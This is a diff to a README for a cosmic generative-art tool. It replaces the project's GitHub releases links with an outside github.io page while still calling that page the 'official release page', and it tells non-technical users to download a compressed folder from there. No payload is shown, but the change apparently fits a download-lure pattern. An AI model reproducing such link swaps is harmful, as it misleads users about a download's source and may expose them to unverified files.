@@ -1,6 +1,6 @@
 # 🌌 Celestial-Grove-Generative-Art - Create unique cosmic art with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Saqibullahs5151/Celestial-Grove-Generative-Art/releases)
+[![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://saqibullahs5151.github.io)
 
 Celestial Grove turns your computer into a digital canvas for cosmic trees. This software crafts complex branch patterns, luminous moons, and deep space backgrounds. You do not need to understand code or design theory to use these tools. The software uses modern browser technology to render high-quality images. Designers use these patterns for clothing, fabric prints, and digital art projects.
 
@@ -10,7 +10,7 @@ Your computer needs to run a standard version of Windows 10 or Windows 11. Ensur
 
 ## 💾 Saving and Installing
 
-1. Visit the [official release page](https://github.com/Saqibullahs5151/Celestial-Grove-Generative-Art/releases).
+1. Visit the [official release page](https://saqibullahs5151.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link to download the compressed folder.
 4. Save the file to your desktop or a folder you can find easily.
